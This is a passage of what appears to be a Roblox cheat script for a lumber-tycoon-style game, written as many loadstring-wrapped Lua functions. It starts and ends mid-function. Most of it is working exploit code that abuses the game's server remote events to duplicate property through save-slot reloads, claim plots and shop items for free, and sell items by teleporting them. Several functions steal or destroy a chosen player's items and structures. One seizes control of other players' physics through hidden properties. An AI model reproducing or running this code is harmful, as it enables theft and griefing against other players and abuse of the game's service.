	Humanoid.JumpPower = _G.JP
end
]])();
----------------//funtion//-------------------
loadstring([[
function Alwaysday()
	game.Lighting.TimeOfDay = "12:00:00"
	game.Lighting.Brightness = 1
	_G.d = t;
end
]])();
----------------//funtion//-------------------
loadstring([[
function AlwaysNight()
game.Lighting.TimeOfDay = "24:00:00"
	game.Lighting.Brightness = 0
	_G.n = t;
end
]])();
----------------//funtion//-------------------
loadstring([[
function ClearFog()
    state = (state) == true 
    while state do
    game: service"RunService".RenderStepped:wait()
    game.Lighting.FogEnd = 9999
    end
end
]])();
----------------//funtion//-------------------
loadstring([[
function SpookMode()
game.Lighting.Spook.Value = state
end
]])();
----------------//funtion//-------------------
loadstring([[
function RemoveLava()
    for i,v in pairs(game.Workspace.Region_Volcano:GetDescendants()) do
        if v.Name == "TouchInterest" then
          v:Destroy()
        elseif v.Name == "Lava" then
          for i,c in pairs(v:GetChildren()) do
            if c:IsA("Part") then
              if state == true then
                c.Transparency = 1
              else    
                c.Transparency = 0
              end
            end
          end
        end
      end
end
]])();
----------------//funtion//-------------------
loadstring([[
function Boulders()
    local destroy = true
    local boulders = workspace.Region_Volcano:FindFirstChild("PartSpawner")
    while destroy == true do
    for i, v in pairs(boulders:GetChildren()) do
     v:Destroy()
            end
            wait(2)
        end 
end
]])();
----------------//funtion//-------------------
loadstring([[
function Shopitems()
    for i,v in pairs(game.Workspace.Stores:GetChildren()) do
        if v.Name == "ShopItems" then
        spawn(function()
        for a,b in pairs(v:GetChildren()) do 
        game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(b)
        game.ReplicatedStorage.Interaction.DestroyStructure:FireServer(b)
        end
        end)
        end
        end
end
]])();
----------------//funtion//-------------------
loadstring([[
function ClaimShopitems()
    for i,v in pairs(game.Workspace.Properties:GetChildren()) do
        if v:FindFirstChild("Owner") and v.Owner.Value == game.Players.LocalPlayer then
        spawn(function()
        for a,b in pairs(v:GetChildren()) do 
        game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(b)
        game.ReplicatedStorage.Interaction.ClientRequestOwnership:FireServer(b)     
        end
        end)
        end  
        end
end
]])();
--------------//ss//------------------------
loadstring([[
function Temp()
	for _,f in pairs(game.ReplicatedStorage.Purchasables.Structures.BlueprintStructures:GetChildren()) do
		local CloneBP = f:Clone()
		CloneBP.Parent = game.Players.LocalPlayer.PlayerBlueprints.Blueprints
	end
end
]])();
----------------//funtion//-------------------
loadstring([[
function box()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1668.42932, 349.601929, 1476.00793)
wait(5)
for i,v in pairs(game.Workspace.Properties:GetChildren()) do
if v.Owner.Value == game.Players.LocalPlayer then
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.OriginSquare.CFrame
end
end
end
]])();
----------------//funtion//-------------------
loadstring([[
function ClaimAllPlots()
    for i, v in pairs(game.Workspace.Properties:GetChildren()) do
        if v:FindFirstChild("Owner") and v.Owner.Value == nil then
            game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(v)
        end
    end
end
]])();
----------------//funtion//-------------------
----------------//funtion//-------------------
loadstring([[
function FreeLand()
    for a,b in pairs(workspace.Properties:GetChildren()) do 
        if b:FindFirstChild("Owner") and b:FindFirstChild("OriginSquare") and b.Owner.Value == nil then 
       wait(1)
       game.ReplicatedStorage.PropertyPurchasing.ClientPurchasedProperty:FireServer(b, b.OriginSquare.OriginCFrame.Value.p + Vector3.new(0,3,0))
      for i,v in pairs(game.Workspace.Properties:GetChildren()) do
       if v.Owner.Value == game.Players.LocalPlayer then
      wait(0.1)
       game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.OriginSquare.CFrame + Vector3.new(0,10,0)
      wait(0.1)
       game.Players.LocalPlayer.Character.Jump = false
      break
      end
      end
      end
      end
      end
]])();
----------------//funtion//-------------------
local itemCount = 0
function tpItem(item, pos)
	if itemCount == 200 then
		wait(2)
		itemCount = 0
	end
	local res = game:GetService("ReplicatedStorage").PlaceStructure.ClientPlacedStructure:FireServer(nil, pos, player, nil, item, true)
	itemCount = itemCount + 1
end
----------------//function//------------------
loadstring([[
function toggleNoClip()
	local disableCollide
	disableCollide = game:GetService("RunService").Stepped:connect(function()
		for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
			if noclipping == false then
				disableCollide:Disconnect()
				return
			end
			if v:IsA("BasePart") then
				v.CanCollide = false
			end
		end
	end)
end
]])();
----------------//function//------------------
loadstring([[
function Maxland()
for i, v in pairs(game:GetService("Workspace").Properties:GetChildren()) do
		if v:FindFirstChild("Owner") and v.Owner.Value == game.Players.LocalPlayer then
			base = v
			square = v.OriginSquare
		end
	end
	function Expandbase(pos)
		local Event = game:GetService("ReplicatedStorage").PropertyPurchasing.ClientExpandedProperty
		Event:FireServer(base, pos)
	end
	spos = square.Position
	Expandbase(CFrame.new(spos.X + 40, spos.Y, spos.Z))
	Expandbase(CFrame.new(spos.X - 40, spos.Y, spos.Z))
	Expandbase(CFrame.new(spos.X, spos.Y, spos.Z + 40))
	Expandbase(CFrame.new(spos.X, spos.Y, spos.Z - 40))
	Expandbase(CFrame.new(spos.X + 40, spos.Y, spos.Z + 40))
	Expandbase(CFrame.new(spos.X + 40, spos.Y, spos.Z - 40))
	Expandbase(CFrame.new(spos.X - 40, spos.Y, spos.Z + 40))
	Expandbase(CFrame.new(spos.X - 40, spos.Y, spos.Z - 40))
	Expandbase(CFrame.new(spos.X + 80, spos.Y, spos.Z))
	Expandbase(CFrame.new(spos.X - 80, spos.Y, spos.Z))
	Expandbase(CFrame.new(spos.X, spos.Y, spos.Z + 80))
	Expandbase(CFrame.new(spos.X, spos.Y, spos.Z - 80))
	Expandbase(CFrame.new(spos.X + 80, spos.Y, spos.Z + 80))
	Expandbase(CFrame.new(spos.X + 80, spos.Y, spos.Z - 80))
	Expandbase(CFrame.new(spos.X - 80, spos.Y, spos.Z + 80))
	Expandbase(CFrame.new(spos.X - 80, spos.Y, spos.Z - 80))
	Expandbase(CFrame.new(spos.X + 40, spos.Y, spos.Z + 80))
	Expandbase(CFrame.new(spos.X - 40, spos.Y, spos.Z + 80))
	Expandbase(CFrame.new(spos.X + 80, spos.Y, spos.Z + 40))
	Expandbase(CFrame.new(spos.X + 80, spos.Y, spos.Z - 40))
	Expandbase(CFrame.new(spos.X - 80, spos.Y, spos.Z + 40))
	Expandbase(CFrame.new(spos.X - 80, spos.Y, spos.Z - 40))
	Expandbase(CFrame.new(spos.X + 40, spos.Y, spos.Z - 80))
	Expandbase(CFrame.new(spos.X - 40, spos.Y, spos.Z - 80)) 
end
]])();
----------------//function//------------------
loadstring([[
function Tool()
local TypeName = "Tool"
for i,v in pairs(game:GetService("Workspace").PlayerModels:GetChildren()) do
    if v:FindFirstChild("Type") and tostring(v.Type.Value) == TypeName then
   
    local Plr = game:GetService("Players").LocalPlayer
    local Mouse = Plr:GetMouse()

    local selection = Instance.new("SelectionBox")
    selection.Color3 = Color3.new(95,95,95)
    selection.Parent = v.Type.Parent
    selection.Adornee = selection.Parent
    else 
end
end
end
]])();
----------------//function//------------------
loadstring([[
function Gift()
local TypeName = "Gifts"

for i,v in pairs(game:GetService("Workspace").PlayerModels:GetChildren()) do
    if v:FindFirstChild("Type") and tostring(v.Type.Value) == TypeName then
   
    local Plr = game:GetService("Players").LocalPlayer
    local Mouse = Plr:GetMouse()

    local selection = Instance.new("SelectionBox")
    selection.Color3 = Color3.new(95,95,95)
    selection.Parent = v.Type.Parent
    selection.Adornee = selection.Parent
    else 
end
end
end
]])();
----------------//function//------------------
loadstring([[
function Loose()
local TypeName = "Loose items"

for i,v in pairs(game:GetService("Workspace").PlayerModels:GetChildren()) do
    if v:FindFirstChild("Type") and tostring(v.Type.Value) == TypeName then
   
    local Plr = game:GetService("Players").LocalPlayer
    local Mouse = Plr:GetMouse()

    local selection = Instance.new("SelectionBox")
    selection.Color3 = Color3.new(95,95,95)
    selection.Parent = v.Type.Parent
    selection.Adornee = selection.Parent
    else 
end
end
end
]])();
----------------//function//------------------
loadstring([[
function TakeWood()
    local UserInputService = game:GetService("UserInputService")
    local Mouse = game:GetService("Players").LocalPlayer:GetMouse()
    local Folder = Instance.new("Folder", game:GetService("Workspace"))
    local Part = Instance.new("Part", Folder)
    local Attachment1 = Instance.new("Attachment", Part)
    Part.Anchored = true
    Part.CanCollide = false
    Part.Transparency = 1
    local Updated = Mouse.Hit + Vector3.new(0, 5, 0)
    local NetworkAccess = coroutine.create(function()
        settings().Physics.AllowSleep = false
        while game:GetService("RunService").RenderStepped:Wait() do
            for _, Players in next, game:GetService("Players"):GetPlayers() do
                if Players ~= game:GetService("Players").LocalPlayer then
                    Players.MaximumSimulationRadius = 0 
                    sethiddenproperty(Players, "SimulationRadius", 0) 
                end 
            end
            game:GetService("Players").LocalPlayer.MaximumSimulationRadius = math.pow(math.huge,math.huge)
            setsimulationradius(math.huge) 
        end 
    end) 
    coroutine.resume(NetworkAccess)
    local function ForcePart(v)
        if v:IsA("Part") and v.Anchored == false and v.Parent:FindFirstChild("Humanoid") == nil and v.Parent:FindFirstChild("Head") == nil and v.Name ~= "Handle" then
            Mouse.TargetFilter = v
            for _, x in next, v:GetChildren() do
                if x:IsA("BodyAngularVelocity") or x:IsA("BodyForce") or x:IsA("BodyGyro") or x:IsA("BodyPosition") or x:IsA("BodyThrust") or x:IsA("BodyVelocity") or x:IsA("RocketPropulsion") then
                    x:Destroy()
                end
            end
            if v:FindFirstChild("Attachment") then
                v:FindFirstChild("Attachment"):Destroy()
            end
            if v:FindFirstChild("AlignPosition") then
                v:FindFirstChild("AlignPosition"):Destroy()
            end
            if v:FindFirstChild("Torque") then
                v:FindFirstChild("Torque"):Destroy()
            end
            v.CanCollide = false
            local Torque = Instance.new("Torque", v)
            Torque.Torque = Vector3.new(100000, 100000, 100000)
            local AlignPosition = Instance.new("AlignPosition", v)
            local Attachment2 = Instance.new("Attachment", v)
            Torque.Attachment0 = Attachment2
            AlignPosition.MaxForce = 9999999999999999
            AlignPosition.MaxVelocity = math.huge
            AlignPosition.Responsiveness = 200
            AlignPosition.Attachment0 = Attachment2 
            AlignPosition.Attachment1 = Attachment1
        end
    end
    for _, v in next, game:GetService("Workspace"):GetDescendants() do
        ForcePart(v)
    end
    game:GetService("Workspace").DescendantAdded:Connect(function(v)
        ForcePart(v)
    end)
    UserInputService.InputBegan:Connect(function(Key, Chat)
        if Key.KeyCode == Enum.KeyCode.p and not Chat then
           Updated = Mouse.Hit + Vector3.new(0, 5, 0)
        end
    end)
    
    spawn(function()
        while game:GetService("RunService").RenderStepped:Wait() do
            Attachment1.WorldCFrame = Updated
        end
    end)
end
]])();
----------------//funtion//-------------------
loadstring([[
function RemoveTress()
	for s,d in pairs (game.Workspace:GetChildren()) do
        if d.Name == "TreeRegion" then
        d:Destroy()
        else 
        print("No Trees Found")
    end
    end
end
]])();
----------------//funtion//-------------------
loadstring([[
function DropAxes()
    for a,b in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
    if b.Name == "Tool" and b.ClassName == "Tool" then
      game.ReplicatedStorage.Interaction.ClientInteracted:FireServer(b, "Drop tool", game.Players.LocalPlayer.Character.Head.CFrame)
    end
    end
    end
    ]])();
----------------//funtion//-------------------
loadstring([[
function PickAxes()
    if #game.Players.LocalPlayer.Backpack:GetChildren() < 9 then
        game:GetService("ReplicatedStorage").Interaction.ClientInteracted:FireServer(b,"Pick up tool")
        wait(0.2)
        if LP.Character:FindFirstChild("Tool") then
          LP.Character.Tool.Parent = game.Players.LocalPlayer.Backpack
        end
    end
end
]])();
----------------//funtion//-------------------
loadstring([[
function MaxlandDupe()
Maxland()
game.ReplicatedStorage.Interaction.ClientSetListPlayer:InvokeServer(game:GetService'Players'.LocalPlayer.WhitelistFolder, game.Players.LocalPlayer, true)
Maxland()
Maxland()
local LoadSlot = game.ReplicatedStorage.LoadSaveRequests.ClientMayLoad:InvokeServer(Player)
if LoadSlot then
game.ReplicatedStorage.LoadSaveRequests.RequestLoad:InvokeServer(game.Players.LocalPlayer.CurrentSaveSlot.Value, Player)
game.ReplicatedStorage.Interaction.ClientSetListPlayer:InvokeServer(game:GetService'Players'.LocalPlayer.WhitelistFolder, game.Players.LocalPlayer, false)
game:GetService("Players").LocalPlayer.PlayerGui.Chat.Frame.Visible = false
repeat
wait(0.1)
until game:GetService("Players").LocalPlayer.PlayerGui.PropertyPurchasingGUI.SelectPurchase.Visible == true
wait(.2)
Manager:SendKeyEvent(true,"E",false,game)
repeat
wait(0.1)
until game:GetService("Players").LocalPlayer.PlayerGui.PropertyPurchasingGUI.ConfirmPurchase.Visible == true
wait(1.2)
Manager:SendKeyEvent(true,"E",false,game)
wait(2.5)
end
end
]])();
----------------//funtion//-------------------
function SelfDupe()
game.ReplicatedStorage.Interaction.ClientSetListPlayer:InvokeServer(game:GetService'Players'.LocalPlayer.WhitelistFolder, game.Players.LocalPlayer, true)
local LoadSlot = game.ReplicatedStorage.LoadSaveRequests.ClientMayLoad:InvokeServer(Player)
if LoadSlot then
game.ReplicatedStorage.LoadSaveRequests.RequestLoad:InvokeServer(game.Players.LocalPlayer.CurrentSaveSlot.Value, Player)
game.ReplicatedStorage.Interaction.ClientSetListPlayer:InvokeServer(game:GetService'Players'.LocalPlayer.WhitelistFolder, game.Players.LocalPlayer, false)
game:GetService("Players").LocalPlayer.PlayerGui.Chat.Frame.Visible = false
repeat
wait(0.1)
until game:GetService("Players").LocalPlayer.PlayerGui.PropertyPurchasingGUI.SelectPurchase.Visible == true
wait(.2)
Manager:SendKeyEvent(true,"E",false,game)
repeat
wait(0.1)
until game:GetService("Players").LocalPlayer.PlayerGui.PropertyPurchasingGUI.ConfirmPurchase.Visible == true
wait(1.2)
Manager:SendKeyEvent(true,"E",false,game)
wait(2.5)
end
end
----------------//funtion//-------------------
loadstring([[
function Selllogs()
    for _, Log in pairs(workspace.LogModels:GetChildren()) do
        if Log.Name:sub(1, 6) == "Loose_" and Log:findFirstChild("Owner") then
            if Log.Owner.Value == game.Players.LocalPlayer then
                for i,v in pairs(Log:GetChildren()) do
                    if v.Name=="WoodSection" then
                        spawn(function()
                            for i=1,10 do
                                wait()
                                v.CFrame=CFrame.new(Vector3.new(315, -0.296, 85.791))*CFrame.Angles(math.rad(90),0,0)
                            end
                        end)
                    end
                end
                spawn(function()
                    for i=1,20 do
                        wait()
                        game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(Log)
                    end
                end)
            end
        end
    print("sold logs")
	end 
end
]])();
----------------//Exaca//-------------------
loadstring([[
function leakeditems(value)
    if value == true then
        game.ReplicatedStorage.Purchasables:Clone().Parent = game.Workspace.PlayerModels
        end
        if value == false then 
        game.ReplicatedStorage.Purchasables:Clone().Parent = game.Workspace.PlayerModels:Destroy()
        end
        end
    ]])();
----------------//Lighting//-------------------

----------------//funtion//-------------------



----------------//funtion//-------------------
loadstring([[
function SellSold()
    for i,v in pairs(workspace.PlayerModels:GetDescendants()) do 
        if v:FindFirstChild("Owner") and v.Owner.Value == game.Players.LocalPlayer and v:FindFirstChild("ItemName") and v.ItemName.Value == "PropertySoldSign" then
            print(v.Owner.Value)
        if v.Main then
       game.ReplicatedStorage.Interaction.ClientRequestOwnership:FireServer(v.Main)
      v.Main.CFrame = CFrame.new(316.222229, -0.56983912, 79.0911713, 0.999756873, -0.00054633111, 0.0220430512, 0.000931310933, 0.999847174, -0.0174584202, -0.0220301449, 0.0174747054, 0.999604583)
      game.ReplicatedStorage.Interaction.ClientRequestOwnership:FireServer(v.Main)
      v.Main.CFrame = CFrame.new(316.222229, -0.56983912, 79.0911713, 0.999756873, -0.00054633111, 0.0220430512, 0.000931310933, 0.999847174, -0.0174584202, -0.0220301449, 0.0174747054, 0.999604583)
      game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(v.Main)
      v.Main.CFrame = CFrame.new(316.222229, -0.56983912, 79.0911713, 0.999756873, -0.00054633111, 0.0220430512, 0.000931310933, 0.999847174, -0.0174584202, -0.0220301449, 0.0174747054, 0.999604583)
      wait()
    end
        end
    end
end
]])();
----------------//funtion//-------------------
loadstring([[
function SellPlanks()
    for _, Plank in pairs(game.Workspace.PlayerModels:GetChildren()) do
           if Plank.Name=="Plank" and Plank:findFirstChild("Owner") then
               if Plank.Owner.Value == game.Players.LocalPlayer then
                   for i,v in pairs(Plank:GetChildren()) do
                       if v.Name=="WoodSection" then
                           spawn(function()
                               for i=1,10 do
                                   wait()
                                   v.CFrame=CFrame.new(Vector3.new(315, -0.296, 85.791))*CFrame.Angles(math.rad(90),0,0)
                               end
                           end)
                       end
                   end
                   spawn(function()
                       for i=1,20 do
                           wait()
                           game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(Plank)
                       end
                   end)
               end
           end
       end
   end
   ]])();
----------------//funtion//-------------------
loadstring([[
function teleport()
    for _, Log in pairs(game.Workspace.LogModels:GetChildren()) do
        if Log.Name:sub(1, 6) == "Loose_" and Log:findFirstChild("Owner") then
            if Log.Owner.Value == game.Players.LocalPlayer then
                Log:MoveTo(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0, 20, 0))
                for i=1,100 do
                    game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(Log)
                end
            end
        end
end 
end
]])();
----------------//funtion//-------------------
loadstring([[
function Grid()
    if value then
        for i, v in pairs (game:GetService("Workspace").Properties:GetDescendants()) do
        if v:FindFirstChild("Owner") and tostring(v.Owner.Value) == game.Players.LocalPlayer.Name then
        local p = Instance.new("Part", v.OriginSquare)
        p.Name = "Test"
        p.Position = v.OriginSquare.Position + Vector3.new(0,0.2,0)
        p.Size = Vector3.new(200, 0.05, 200)
        p.Anchored = true
        p.CanCollide = false
        p.Transparency = 1
        local texture = Instance.new("Texture",  v.OriginSquare.Test)
        texture.Texture = "rbxassetid://2608576497"
        texture.StudsPerTileU = 4
        texture.StudsPerTileV = 4
        texture.Face = "Top"
        end
        end
        else
        for i,v in pairs(game.Workspace:GetDescendants()) do
        if v.Name == "Test" then
        v:Destroy()
        end
        end
        end
end
]])();
----------------//funtion//-------------------
loadstring([[
function WaterTranperency()
    for i,v in pairs(game:GetService("Workspace").Water:GetChildren()) do
        if v.Name == "Water" then
        v.Transparency = 1
        else
        v.Transparency = 0
    end
    end
end
]])();
----------------//funtion//-------------------
loadstring([[
function Freecam()
    ToggleKey = Enum.KeyCode.M

    SprintKey = Enum.KeyCode.Tab
    
    localPlayer = game.Players.LocalPlayer
    
    Camera = game.Workspace.CurrentCamera
    Mouse = localPlayer:GetMouse()
    
    UserInputService = game:GetService("UserInputService")
    
    
    movePosition = Vector2.new(0,0)
    moveDirection = Vector3.new(0,0,0)
    
    targetMovePosition = movePosition
    
    Y_Sensitivity = 300;
    X_Sensitivity = 300;
    
    lastRightButtonDown = Vector2.new(0,0)
    rightMouseButtonDown = false
    
    targetFOV = 70
    
    sprinting = false;
    sprintingSpeed = 3;
    
    keysDown = {}
    
    moveKeys = {
        [Enum.KeyCode.D] = Vector3.new(1,0,0),
        [Enum.KeyCode.A] = Vector3.new(-1,0,0),
        [Enum.KeyCode.S] = Vector3.new(0,0,1),
        [Enum.KeyCode.W] = Vector3.new(0,0,-1),
        [Enum.KeyCode.E] = Vector3.new(0,1,0),
        [Enum.KeyCode.Q] = Vector3.new(0,-1,0)
    }
    
    Tween = function(a,b,t)
        if t == 1 then
            return b
        else 
            if tonumber(a) then
                return a * (1-t) + (b*t)
            else
                return a:Lerp(b,t);
            end
        end
    end
    
    ClampVector3 = function(x,min,max)
        return 
            Vector3.new(
                math.clamp(x.X,min.X,max.X),
                math.clamp(x.Y,min.Y,max.Y),
                math.clamp(x.Z,min.Z,max.Z)
            )
    
    end
    
    
    UserInputService.InputChanged:connect(function(inputObject)
        if inputObject.UserInputType == Enum.UserInputType.MouseMovement then
            movePosition = movePosition + Vector2.new(inputObject.Delta.x,inputObject.Delta.y)
        end
    end)
    
    CalculateMovement = function()
        local newMovement = Vector3.new(0,0,0)
        for i,v in pairs(keysDown) do
            newMovement = newMovement + (moveKeys[i] or Vector3.new(0,0,0))
        end
        return newMovement
    end
    
    Round = function(num, numDecimalPlaces)
        return math.floor((num/numDecimalPlaces) + .5)*numDecimalPlaces
    end
    
    Input = function(input,gameProcessed)
        if moveKeys[input.KeyCode] then
            if input.UserInputState == Enum.UserInputState.Begin then
                keysDown[input.KeyCode] = true
            elseif input.UserInputState == Enum.UserInputState.End then
                keysDown[input.KeyCode] = nil
            end
        else
            if input.UserInputState == Enum.UserInputState.Begin then
                print(input.KeyCode)
                if input.UserInputType == Enum.UserInputType.MouseButton2 then
                    rightMouseButtonDown = true
                    lastRightButtonDown = Vector2.new(Mouse.X,Mouse.Y)
                    UserInputService.MouseBehavior = Enum.MouseBehavior.LockCurrentPosition
                elseif input.KeyCode == Enum.KeyCode.Z then
                    targetFOV = 20
                elseif input.KeyCode == SprintKey then
                    sprinting = true
                end
            else
                if input.UserInputType == Enum.UserInputType.MouseButton2 then
                    rightMouseButtonDown = false
                    UserInputService.MouseBehavior = Enum.MouseBehavior.Default
                elseif input.KeyCode == Enum.KeyCode.Z then
                    targetFOV = 70
                elseif input.KeyCode == SprintKey then
                    sprinting = false
                end
            end
        end
    end
    
    Mouse.WheelForward:connect(function()
        Camera.CoordinateFrame = Camera.CoordinateFrame * CFrame.new(0,0,-5)
    end)
    
    Mouse.WheelBackward:connect(function()
        Camera.CoordinateFrame = Camera.CoordinateFrame * CFrame.new(-0,0,5)
    end)
    
    UserInputService.InputBegan:connect(Input)
    UserInputService.InputEnded:connect(Input)
    
    local Toggled = false
    game:GetService("UserInputService").InputBegan:connect(function(inputObject)
        if inputObject.KeyCode == ToggleKey then
            Toggled = not Toggled
            if Toggled then
                Camera.CameraType = Enum.CameraType.Scriptable
                game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
                game.Players.LocalPlayer.Character.Humanoid.PlatformStand = true 
            else
                game.Players.LocalPlayer.Character.Humanoid.PlatformStand = false
                game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
                game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
                game.Workspace.CurrentCamera.CameraType = "Custom"
            end
        end
    end)
    
    
    game:GetService("RunService").RenderStepped:Connect(function()
        if Toggled then
            local mouseTarget = Mouse.Hit
    
            targetMovePosition = movePosition
            Camera.CoordinateFrame = CFrame.new(Camera.CoordinateFrame.p) * CFrame.fromEulerAnglesYXZ(-targetMovePosition.Y/Y_Sensitivity ,-targetMovePosition.X/X_Sensitivity, 0) * CFrame.new(CalculateMovement() * ((({[true]=sprintingSpeed})[sprinting]) or .5) )
            Camera.FieldOfView = Tween(Camera.FieldOfView,targetFOV,.5)
            if rightMouseButtonDown then
                UserInputService.MouseBehavior = Enum.MouseBehavior.LockCurrentPosition
                movePosition = movePosition - (lastRightButtonDown - Vector2.new(Mouse.X,Mouse.Y))
                lastRightButtonDown = Vector2.new(Mouse.X,Mouse.Y)
            end
        end
    end)
end
]])();
----------------//funtion//-------------------
loadstring([[
function Maker()
    local selCenter = Instance.new("SelectionBox")
	selCenter.Color3 = Color3.new(1, 0, 0)
	if t == true then
		for i, v in pairs(game.Workspace.Properties:GetChildren()) do
			if v:FindFirstChild("Owner") and v.Owner.Value == game.Players.LocalPlayer then
				centerSquare = v.OriginSquare
			end
		end
		selCenter.Parent = centerSquare
		selCenter.Adornee = centerSquare
	else
		if centerSquare:FindFirstChild("SelectionBox") then
			centerSquare.SelectionBox:Destroy()
		end
	end
end
]])();
----------------//funtion//-------------------
loadstring([[
function TeleportTool()
    mouse = game.Players.LocalPlayer:GetMouse()
    tool = Instance.new("Tool")
    tool.RequiresHandle = false
    tool.Name = "Teleport Tool"
    tool.Activated:connect(function()
    local pos = mouse.Hit+Vector3.new(0,2.5,0)
    pos = CFrame.new(pos.X,pos.Y,pos.Z)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
    end)
    tool.Parent = game.Players.LocalPlayer.Backpack
end
]])();
----------------//funtion//-------------------
loadstring([[
function Basetp()
	for i,v in pairs(game.Workspace.Properties:GetChildren()) do
        if v.Owner.Value == game.Players.LocalPlayers then
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.OriginSquare.CFrame
        end
        end
end
]])();
----------------//funtion//-------------------
loadstring([[
function POG()
	for i,v in pairs(game.Workspace.Properties:GetChildren()) do
        if v.Owner.Value == plrselected then
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.OriginSquare.CFrame
        end
        end
end
]])();
----------------//funtion//-------------------
----------------//funtion//-------------------
loadstring([[
function Cords()
    function round(num, numDecimalPlaces)
        local mult = 10^(numDecimalPlaces or 0)
        return math.floor(num * mult + 0.5) / mult
    end
    LocationX = round(game.Players.LocalPlayer.Character.HumanoidRootPart.Position.x, 1)
    LocationY = round(game.Players.LocalPlayer.Character.HumanoidRootPart.Position.y, 1)
    LocationZ = round(game.Players.LocalPlayer.Character.HumanoidRootPart.Position.z, 1)
end
]])();
----------------//funtion//-------------------
loadstring([[
function So()
    local plr =  _G.Player
    local StealType = item
    local Teleported = 0
    qty = tonumber(qty)
   if Teleported < qty then
    print("test1")
    for i,v in pairs(game.Workspace.PlayerModels:GetChildren()) do
      if Teleported < qty then
    if v:FindFirstChild("Owner") and tostring(v.Owner.Value) == plr then
    if v:FindFirstChild("Type") and tostring(v.Type.Parent) == StealType then
    if v.PrimaryPart then
    v.PrimaryPart.CFrame = CFrame.new(LocationX, LocationY, LocationZ)
    game.ReplicatedStorage.Interaction.ClientRequestOwnership:FireServer(v.PrimaryPart)
    v.PrimaryPart.CFrame = CFrame.new(LocationX, LocationY, LocationZ)
    game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(v.PrimaryPart)
    v.PrimaryPart.CFrame = CFrame.new(LocationX, LocationY, LocationZ)
    wait(0.1)
    Teleported = Teleported + 1
    end
    end
    end
    end
    end
   end
end
]])();
----------------//funtion//-------------------
loadstring([[
function wood()
local Type = "TreeClass"
    local Times = 0
    local hrp = game.Players.LocalPlayer.Character.HumanoidRootPart
    for i, v in pairs(game.Workspace.PlayerModels:GetChildren()) do
        if v:FindFirstChild("Owner") and tostring(v.Owner.Value) == plrselected then
            if v:FindFirstChild("Type") and tostring(v.Type.Value) == Type then
            end
            if v:FindFirstChild("TreeClass") and v.WoodSection then
                if (hrp.CFrame.p - v.WoodSection.CFrame.p).Magnitude < 100 then
                    v.WoodSection.CFrame = CFrame.new(LocationX, LocationY, LocationZ) * CFrame.Angles(math.rad(90), 165, 0)
                    game.ReplicatedStorage.Interaction.ClientRequestOwnership:FireServer(v.WoodSection)
                    v.WoodSection.CFrame = CFrame.new(LocationX, LocationY, LocationZ) * CFrame.Angles(math.rad(90), 165, 0)
                    game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(v.WoodSection)
                    v.WoodSection.CFrame = CFrame.new(LocationX, LocationY, LocationZ) * CFrame.Angles(math.rad(90), 165, 0)
                    Times = Times + 0.5
                    if Times == 10 then
                        Times = 0
                        wait(0.1)
                    end
                end
            end
        end
    end
end
]])();
----------------//function//------------------
loadstring([[
function Clearb()
	for i, v in pairs(game.Workspace.PlayerModels:GetChildren()) do
		if v:FindFirstChild("Owner") and v:FindFirstChild("Type") and v.Owner.Value == game.Players.LocalPlayer then
			if v.Type.Value == "Blueprint" then
				local A_1 = v
				local Event = game:GetService("ReplicatedStorage").Interaction.DestroyStructure
				Event:FireServer(A_1)
			end
		end
	end
end
]])();
----------------//function//------------------
loadstring([[
function clearh()
for i,v in pairs(game.Workspace.PlayerModels:GetChildren()) do
if v:FindFirstChild("Owner") and v:FindFirstChild("Type") and v.Owner.Value == game.Player.LocalPlayer then
if v.Type.Value == "Gift" then
local A_1 = v
local Event = game:GetService("ReplicatedStorage").Interaction.DestroyStructure
Event:FireServer(A_1)
end
end
end
end
]])();
----------------//function//------------------
loadstring([[
function Clearj()
for i,v in pairs(game.Workspace.PlayerModels:GetChildren()) do
if v:FindFirstChild("Owner") and v:FindFirstChild("Type") and v.Owner.Value == game.Player.LocalPlayer then
if v.Type.Value == "Tool" then
local A_1 = v
local Event = game:GetService("ReplicatedStorage").Interaction.DestroyStructure
Event:FireServer(A_1)
end
end
end
end
]])();
----------------//function//------------------
loadstring([[
function Clearv()
for i,v in pairs(game.Workspace.PlayerModels:GetChildren()) do
if v:FindFirstChild("Owner") and v:FindFirstChild("Type") and v.Owner.Value == game.Player.LocalPlayer  then
if v.Type.Value == "Furniture" then
local A_1 = v
local Event = game:GetService("ReplicatedStorage").Interaction.DestroyStructure
Event:FireServer(A_1)
end
end
end
end
]])();
----------------//function//------------------
loadstring([[
function Clearp()
for i,v in pairs(game.Workspace.PlayerModels:GetChildren()) do
if v:FindFirstChild("Owner") and v:FindFirstChild("Type") and v.Owner.Value == game.Player.LocalPlayer then
if v.Type.Value == "TreeClass" then
local A_1 = v
local Event = game:GetService("ReplicatedStorage").Interaction.DestroyStructure
Event:FireServer(A_1)
end
end
end
end
]])();
----------------//function//------------------
loadstring([[
function Clearz()
	for i, v in pairs(game.Workspace.PlayerModels:GetChildren()) do
		if v:FindFirstChild("Owner") and v:FindFirstChild("Type") and v.Owner.Value == plrselected then
			if v.Type.Value == "Structure" or v.Type.Value == "Furniture" then
				local A_1 = v
				local Event = game:GetService("ReplicatedStorage").Interaction.DestroyStructure
				Event:FireServer(A_1)
			end
		end
	end
end
]])();
-----------------//lfep//------
function Loadslot()
local LoadSlot = game.ReplicatedStorage.LoadSaveRequests.ClientMayLoad:InvokeServer(player)
	if LoadSlot then
		game.ReplicatedStorage.LoadSaveRequests.RequestLoad:InvokeServer(Slot, player)
	else
